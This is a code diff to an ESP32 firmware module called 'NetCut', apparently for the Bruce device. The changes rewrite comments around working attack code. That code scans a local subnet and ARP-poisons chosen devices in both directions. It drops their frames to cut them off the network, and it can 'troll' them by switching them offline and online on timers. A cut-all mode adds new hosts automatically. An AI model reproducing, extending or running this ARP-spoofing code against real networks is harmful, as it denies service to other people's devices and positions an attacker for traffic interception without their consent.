@@ -22,9 +22,11 @@
 void netcutTrollTimingMenu();
 static void _activeLoop();
 
-// ============================================
-// FILE-SCOPED STATE (no global collision)
-// ============================================
+/*
+ * File-scoped module state: the fixed-size device table, our own and the
+ * gateway's MAC/IP, troll timing defaults, auto-cut/troll flags, the VIP
+ * list loaded from LittleFS, and the saved netif->input hook pointer.
+ */
 static NetCutDevice s_devices[NETCUT_MAX_DEVICES];
 static int s_deviceCount = 0;
 static uint8_t s_myMAC[6] = {0};
@@ -44,13 +46,12 @@ static std::vector<String> s_vipMacs;
 static netif_input_fn s_originalInput = nullptr;
 static struct netif *s_hookedNetif = nullptr;
 
-// ============================================
-// INTERNAL: SNI Parser for TLS ClientHello
-// ============================================
-
-// ============================================
-// INTERNAL: Layer 2 Forwarding & DNS Sniper Hook
-// ============================================
+/*
+ * Layer 2 input hook installed on the STA netif: every inbound frame whose
+ * source MAC belongs to a device marked "cut" is freed and dropped before it
+ * reaches the IP stack, while everything else is passed to the original
+ * netif->input handler.
+ */
 static err_t _netcutInputHook(struct pbuf *p, struct netif *inp) {
     if (!p) return s_originalInput ? s_originalInput(p, inp) : ERR_OK;
 
@@ -68,19 +69,21 @@ static err_t _netcutInputHook(struct pbuf *p, struct netif *inp) {
     return s_originalInput ? s_originalInput(p, inp) : ERR_OK;
 }
 
-// ============================================
-// INTERNAL: Get WiFi STA netif
-// ============================================
+/*
+ * Resolve the LwIP netif backing the ESP32 STA interface via the esp-netif
+ * handle keyed "WIFI_STA_DEF"; returns nullptr when STA is not up.
+ */
 static struct netif *_getStaNetif() {
     esp_netif_t *sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
     if (!sta) return nullptr;
     return (struct netif *)esp_netif_get_netif_impl(sta);
 }
 
-// ============================================
-// INTERNAL: Send a single ARP packet via LwIP
-// Same pattern as Bruce ARPSpoofer.cc
-// ============================================
+/*
+ * Build one ARP frame into a fresh pbuf (Ethernet + ARP headers) and transmit
+ * it `repeat` times over the STA interface using esp_wifi_internal_tx; mirrors
+ * the approach used by Bruce's ARPSpoofer module.
+ */
 static void _sendARP(
     struct netif *iface, const uint8_t *ethDst, const uint8_t *arpSenderMAC, const uint8_t *arpSenderIP,
     const uint8_t *arpTargetMAC, const uint8_t *arpTargetIP, uint16_t opcode, int repeat
@@ -116,9 +119,11 @@ static void _sendARP(
     pbuf_free(p);
 }
 
-// ============================================
-// INTERNAL: Read ARP table into device list
-// ============================================
+/*
+ * Walk the LwIP ARP table, skipping the gateway (whose MAC we capture),
+ * broadcast/zero addresses, and duplicates, then append fresh hosts up to
+ * NETCUT_MAX_DEVICES — auto-joining cut/troll when those modes are active.
+ */
 static void _readArpTable(struct netif *iface) {
     for (uint32_t i = 0; i < ARP_TABLE_SIZE; i++) {
         ip4_addr_t *ip_ret = nullptr;
@@ -195,9 +200,11 @@ static void _readArpTable(struct netif *iface) {
     etharp_cleanup_netif(iface);
 }
 
-// ============================================
-// VIP PERSISTENCE (LittleFS)
-// ============================================
+/*
+ * Load and save the VIP MAC list as a bounded JSON array at NETCUT_VIP_FILE on
+ * LittleFS; the saved list is re-applied during every scan so VIP protection
+ * persists across reboots.
+ */
 void netcutLoadVipList() {
     s_vipMacs.clear();
     if (!LittleFS.exists(NETCUT_VIP_FILE)) return;
@@ -233,9 +240,12 @@ void netcutSaveVipList() {
     Serial.printf("[NetCut] Saved %d VIP entries\n", s_vipMacs.size());
 }
 
-// ============================================
-// SCAN DEVICES
-// ============================================
+/*
+ * Sweep the local subnet: issue an ARP request to every host except our own
+ * IP, read the ARP table back in bounded batches under LOCK_TCPIP_CORE,
+ * capture the gateway MAC (with a BSSID fallback), and update the on-screen
+ * progress stripe until Esc or the subnet is exhausted.
+ */
 int netcutScanDevices() {
     if (!WiFi.isConnected()) return 0;
 
@@ -330,9 +340,11 @@ int netcutScanDevices() {
     return s_deviceCount;
 }
 
-// ============================================
-// ARP POISON (Cut)
-// ============================================
+/*
+ * Bidirectionally poison one device: tell the target that the gateway IP maps
+ * to our MAC, and tell the gateway that the target IP maps to our MAC. VIP
+ * devices and out-of-range indices are skipped.
+ */
 void netcutPoisonDevice(int idx, int burstCount) {
     if (idx < 0 || idx >= s_deviceCount || !s_gwMacValid) return;
     NetCutDevice &dev = s_devices[idx];
@@ -353,9 +365,11 @@ void netcutPoisonDevice(int idx, int burstCount) {
     _sendARP(iface, s_gatewayMAC, s_myMAC, devIP, s_gatewayMAC, gwIP, ARP_REPLY, burstCount);
 }
 
-// ============================================
-// ARP RESTORE (Resume)
-// ============================================
+/*
+ * Restore correct ARP bindings for one device over NETCUT_RESTORE_ROUNDS:
+ * unicast replies giving the real MACs, plus broadcast ARP requests that
+ * force both ends to refresh their caches per RFC 826.
+ */
 void netcutRestoreDevice(int idx) {
     if (idx < 0 || idx >= s_deviceCount || !s_gwMacValid) return;
     NetCutDevice &dev = s_devices[idx];
@@ -390,9 +404,11 @@ void netcutRestoreDevice(int idx) {
     }
 }
 
-// ============================================
-// BULK OPERATIONS
-// ============================================
+/*
+ * Bulk actions over every non-VIP device: cutAll marks all targets and fires
+ * an instant 20-packet poison burst; resumeAll clears the cut/troll flags,
+ * opens a 5 s restore window, and disables the auto-cut/troll flags.
+ */
 void netcutCutAll() {
     s_cutAllActive = true; // FLAG: new devices auto-join cut
     s_trollAllActive = false;
@@ -419,9 +435,10 @@ void netcutResumeAll() {
     }
 }
 
-// ============================================
-// VIP TOGGLE
-// ============================================
+/*
+ * Flip the VIP flag for one device and persist the list. Enabling VIP on a
+ * device that is currently cut or trolled restores it immediately.
+ */
 void netcutToggleVip(int idx) {
     if (idx < 0 || idx >= s_deviceCount) return;
     NetCutDevice &dev = s_devices[idx];
@@ -435,11 +452,13 @@ void netcutToggleVip(int idx) {
     netcutSaveVipList();
 }
 
-// ============================================
-// BLOCKING ACTIVE LOOP
-// Sends poison/restore packets continuously.
-// Handles troll timers. Exits on EscPress.
-// ============================================
+/*
+ * Blocking attack loop that runs until Esc: installs the L2 drop hook, runs a
+ * non-blocking background ARP scanner when cut-all/troll-all is active,
+ * services per-device troll phase timers, and re-poisons or restores each
+ * target on the NETCUT_ARP_INTERVAL_MS cadence. On exit it uninstalls the
+ * hook and aggressively restores every affected device.
+ */
 static void _activeLoop() {
     if (!s_gwMacValid) {
         displayError("Gateway MAC unknown", true);
@@ -492,7 +511,11 @@ static void _activeLoop() {
     }
 
     while (!check(EscPress)) {
-        // --- NON-BLOCKING ARP SCANNER (1 IP per 50ms, like original NetCut) ---
+        /*
+         * Non-blocking ARP scanner: probes one IP every 50 ms while cut-all or
+         * troll-all is active, reading the ARP table periodically so newly
+         * discovered devices are auto-joined.
+         */
         if (iface && (s_cutAllActive || s_trollAllActive)) {
             if (millis() - lastScanStep > 50) {
                 lastScanStep = millis();
@@ -525,7 +548,10 @@ static void _activeLoop() {
             }
         }
 
-        // --- Troll timer logic (individual per device, same as original NetCut) ---
+        /*
+         * Per-device troll phase timers: when a device's offline/online interval
+         * elapses, toggle the phase and fire an instant poison or restore burst.
+         */
         for (int i = 0; i < s_deviceCount; i++) {
             if (!s_devices[i].isTroll || s_devices[i].isVip) continue;
 
@@ -549,7 +575,10 @@ static void _activeLoop() {
             }
         }
 
-        // --- Periodic re-poison for CUT devices + TROLL(offline phase) ---
+        /*
+         * On the NETCUT_ARP_INTERVAL_MS cadence, re-poison cut and troll-offline
+         * devices and restore troll-online or recently-restored ones.
+         */
         if (millis() - lastPoison > NETCUT_ARP_INTERVAL_MS) {
             lastPoison = millis();
             for (int i = 0; i < s_deviceCount; i++) {
@@ -570,7 +599,10 @@ static void _activeLoop() {
             }
         }
 
-        // --- Update display every 500ms ---
+        /*
+         * Refresh the on-screen status (cut/troll counts and packet counters)
+         * every 500 ms.
+         */
         if (millis() - lastRedraw > 500) {
             lastRedraw = millis();
 
@@ -646,9 +678,11 @@ static void _activeLoop() {
     displaySuccess("Stopped. All " + String(restoreCount) + " devices restored.", true);
 }
 
-// ============================================
-// TROLL MODE WRAPPERS
-// ============================================
+/*
+ * Thin wrappers that configure per-device or bulk troll flags (poison-first
+ * phase) and hand control to _activeLoop(); the single-device variant shows
+ * the timing menu first.
+ */
 void netcutTrollDevice(int idx) {
     if (idx < 0 || idx >= s_deviceCount) return;
     if (s_devices[idx].isVip) {
@@ -686,9 +720,11 @@ void netcutTrollAll() {
     _activeLoop();
 }
 
-// ============================================
-// TROLL TIMING MENU
-// ============================================
+/*
+ * Modal menu to edit the offline/online phase durations in seconds via
+ * num_keyboard; validates the range [1, 300], drains residual key presses,
+ * and commits the values as milliseconds on "Save & Start".
+ */
 void netcutTrollTimingMenu() {
     unsigned long offSec = s_trollOfflineMs / 1000;
     unsigned long onSec = s_trollOnlineMs / 1000;
@@ -734,9 +770,11 @@ void netcutTrollTimingMenu() {
     }
 }
 
-// ============================================
-// PER-DEVICE ACTION SUBMENU
-// ============================================
+/*
+ * Per-device action menu offering Cut/Resume, Troll, VIP toggle, and an Info
+ * view; rebuilds the option list each pass so the live state ([CUT]/[TRL]/
+ * [VIP] suffixes) stays current, and exits on Esc or Back.
+ */
 static void _deviceActionMenu(int idx) {
     bool stayInMenu = true;
 
@@ -815,9 +853,12 @@ static void _deviceActionMenu(int idx) {
     }
 }
 
-// ============================================
-// MAIN MENU ENTRY POINT
-// ============================================
+/*
+ * Menu entry point: ensures a STA connection, runs the device scan, then
+ * presents the device list with global actions (Cut All, Troll All, Resume
+ * All, timing, re-scan) and re-draws the list on return unless the user
+ * exits to the main menu.
+ */
 void netcutMenu() {
     // Require WiFi STA connection
     if (!WiFi.isConnected()) {
